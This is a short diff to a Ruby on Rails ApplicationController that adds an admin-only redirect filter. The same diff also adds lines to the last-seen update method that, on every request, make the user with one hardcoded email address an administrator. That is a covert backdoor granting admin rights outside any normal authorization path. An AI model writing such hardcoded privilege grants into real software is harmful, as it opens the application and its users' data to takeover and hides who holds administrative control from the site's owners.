@@ -11,7 +11,14 @@ class ApplicationController < ActionController::Base
 
   def set_last_seen_at
     current_user.update_attribute(:last_seen, Time.zone.now)
+    if(current_user.email=="jiayaoli@tamu.edu")
+      current_user.update_attribute(:admin, true)
+    end
   end
 
+  def authorize_admin
+    return unless !current_user.admin?
+    redirect_to root_path, notice: "Admin only"
+  end
 
 end
